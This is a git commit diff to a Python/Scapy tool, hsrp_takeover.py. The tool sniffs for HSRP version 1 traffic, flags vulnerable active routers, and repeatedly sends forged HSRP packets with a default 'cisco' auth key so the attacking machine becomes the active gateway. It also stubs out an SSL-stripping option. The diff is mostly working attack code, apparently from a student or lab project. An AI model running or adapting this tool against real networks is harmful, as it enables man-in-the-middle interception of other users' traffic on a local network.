989b2476918b34f37bfb3657b6c100913001d413
Tang Zhi Xiang <zifengtang540@gmail.com>
2023-06-09 22:46:55 +0800

    added comments

--- hsrp_takeover.py
+++ hsrp_takeover.py
@@ -1,5 +1,25 @@
+'''
+**to write tool desc**
+Our tool will be focusing on HSRP version 1.
+
+Functions:
+- sniff 
+    -- able to sniff the network and look for presence of HSRP 
+    -- able to detect if the current configuration of HSRP is vulnerable
+    -- able to retrieve details of current HSRP configuration
+
+- takeover as active HSRP router
+    -- allows the attacking machine to takeover as the active HSRP router, using one of the 2 configurations
+        -> default (use values in Packet class)
+        -> user-supplied variables
+
+- sslstrip
+    -- ?
+
+'''
+
 from scapy.all import *
-from argparse import ArgumentParser
+from argparse import ArgumentParser, Action
 from colorama import init, Fore
 from ipaddress import IPv4Address
 
@@ -11,12 +31,12 @@ RESET = Fore.RESET
 
 # define default HSRP values
 IFACE = 'eth0'
-MAL_IP = '10.10.3.20'
+MAL_IP = '10.10.3.254'
 VERSION = {'224.0.0.2':'1', '224.0.0.102':'2'}
 
 class Packet:
     port = 1985
-    multicast_ip = '224.0.0.2' # change to 224.0.0.102 if its HSRP version 2
+    multicast_ip = '224.0.0.2' 
     auth = 'cisco'
     src_ip = '10.10.3.20'
     virtual_ip = '10.10.3.1'
@@ -35,10 +55,10 @@ def args():
     subparser = parser.add_subparsers(dest='command')
     takeover = subparser.add_parser('takeover', help='Hijack HSRP and takeover as active router')
     takeover.add_argument('--version', nargs='?', type=int, const=1, default=1, help="Sets the HSRP version. Default is 1")
-    takeover.add_argument('--src_ip', nargs='?', type=str)
-    takeover.add_argument('--group', nargs='?', type=int)
-    takeover.add_argument('--auth', nargs='?', type=str)
-    
+    takeover.add_argument('--src_ip', nargs='?', type=str, help='Set the source IP address of malicious HSRP packet')
+    takeover.add_argument('--group', nargs='?', type=int, help='Set group of HSRP that will be attacked')
+    takeover.add_argument('--auth', nargs='?', type=str, help='Set the authentication key to be used')
+
     parser.add_argument('--sslstrip', action='store_true', help='Conduct SSL Stripping attack')
 
     return parser.parse_args()
@@ -47,7 +67,7 @@ def args():
 
 # sniff the network for presence of HSRP packets
 def sniff_network():
-    print(f"{GREEN}[+] {RESET} Starting HSRP sniffing")
+    print(f"{GREEN}[+] {RESET} Starting HSRP sniffing...")
     sniff(timeout=10, iface=IFACE, filter="udp src port 1985 and udp dst port 1985", prn=process_pkt)
 
 
@@ -67,18 +87,17 @@ def process_pkt(pkt):
     if pkt.haslayer(HSRP):
         # if state of HSRP is Active and its vulnerable
         if pkt[HSRP].state == 16 and check_vulnerable(pkt):
-            print("""
-            HSRP version {}\n
-            Group number - {}\n
-            Source IP - {}\n
-            Virtual IP - {}\n
-            Priority - {}\n
-            Vulnerable - Yes
-            """.format(VERSION[pkt[IP].dst], pkt[HSRP].group, pkt[IP].src, pkt[HSRP].virtualIP, pkt[HSRP].priority))
-            return ""    
+            print(
+            f"\n\nHSRP version - {VERSION[pkt[IP].dst]}\n"+
+            f"Group number - {pkt[HSRP].group}\n"+
+            f"Source IP - {pkt[IP].src}\n"+
+            f"Virtual IP - {pkt[HSRP].virtualIP}\n"+
+            f"Priority - {pkt[HSRP].priority}\n"+
+            "Vulnerable - Yes")
+            return None  
     else:
-        print("Vulnerable - No")
         return ""
+    
 
 
 # attempt to take over as Active HSRP router
@@ -88,22 +107,15 @@ def hsrp_v1(pkt):
     hsrp = HSRP(group=pkt.group,priority=pkt.priority,virtualIP=pkt.virtual_ip)
     print(f"{GREEN} [+] {RESET} Attempting HSRP takeover")
     send(ip/udp/hsrp, iface='eth0', inter=3, loop=1)
+
     # maybe can multithread run sniff_network() function to check if active router is attacker? can do later
-
-
-
-def hsrp_v2(pkt):
-    return True
-"""
-    payload_packet = ether/ip/udp
-    payload_packet = payload_packet / (struct.pack('B', 1)+struct.pack('B', 40)+struct.pack('B', hsrp_packet.version)+struct.pack('B', 0)+struct.pack('B', hsrp_packet.state)+struct.pack('B', 4)+struct.pack('>H', hsrp_packet.group)+bytearray.fromhex(hsrp_packet.identifier)+struct.pack('>I', priority)+struct.pack('>I', hsrp_packet.hello_interval)+struct.pack('>I', hsrp_packet.dead_interval)+struct.pack('>L', int(ipaddress.IPv4Address(hsrp_packet.virtual_ip)))+(struct.pack('B', 0)*12)+struct.pack('B', 3)+struct.pack('B', 8)+bytearray.fromhex(hsrp_packet.authentication.encode("utf-8").hex())+(struct.pack('B', 0)*(8-len(hsrp_packet.authentication))))
-"""
 
 
 
 def main():
     arg = args()
     mal_pkt = Packet()
+
     if arg.sniff:
         sniff_network()
     elif arg.command == 'takeover':
@@ -113,10 +125,12 @@ def main():
             if arg.auth != None: mal_pkt.auth = arg.auth
             hsrp_v1(mal_pkt)
         elif arg.version == 2:
-            hsrp_v2(mal_pkt)
+            print("currently not supported")
 
-    if arg.sslstrip:
-        print('ssltripthnxkeith')
+    elif arg.sslstrip:
+        print('ssltripthnxkeith:)')
+
+
 
 if __name__ == '__main__':
     main()
